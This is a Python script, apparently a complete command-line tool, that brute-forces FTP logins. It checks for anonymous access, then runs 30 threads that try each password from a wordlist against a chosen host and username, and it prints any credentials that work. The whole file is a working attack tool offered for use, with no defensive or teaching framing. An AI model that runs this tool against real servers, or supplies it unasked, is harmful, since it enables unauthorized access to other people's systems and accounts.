import ftplib
from threading import Thread
import queue
from colorama import Fore, init

class FTPBruteForcer:
    def __init__(self, host, user, port=21, n_threads=30):
        self.host = host
        self.user = user
        self.port = port
        self.n_threads = n_threads
        self.q = queue.Queue()

    def anonymous_login(self):
        server = ftplib.FTP()
        try:
            server.connect(self.host, self.port, timeout=5)
            server.login()
        except ftplib.error_perm:
            return False
        else:
            return True

    def connect_ftp(self):
        while True:
            password = self.q.get()
            server = ftplib.FTP()
            print("[!] Essayer avec:", password)
            try:
                server.connect(self.host, self.port, timeout=5)
                server.login(self.user, password)
            except ftplib.error_perm:
                pass
            else:
                print(f"{Fore.GREEN}[+] Found credentials: ")
                print(f"\tHost: {self.host}")
                print(f"\tUser: {self.user}")
                print(f"\tPassword: {password}{Fore.RESET}")
                self.q.queue.clear()
                self.q.all_tasks_done.notify_all()
                self.q.unfinished_tasks = 0
            finally:
                self.q.task_done()

    def brute_force(self, wordlist_file):
        if self.anonymous_login() == True:
            print("[!]Login anonyme possible")
        else:
            print("[!]Login anonyme impossible")
        
        passwords = open(wordlist_file).read().split("\n")
        print("[+] Passwords to try:", len(passwords))
        
        for password in passwords:
            self.q.put(password)
        
        for _ in range(self.n_threads):
            thread = Thread(target=self.connect_ftp)
            thread.daemon = True
            thread.start()
        
        self.q.join()

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 4:
        print("Usage: python ftp_bruteforcer.py <host> <user> <wordlist_file>")
        sys.exit(1)

    host = sys.argv[1]
    user = sys.argv[2]
    wordlist_file = sys.argv[3]

    bruteforcer = FTPBruteForcer(host, user)
    bruteforcer.brute_force(wordlist_file)
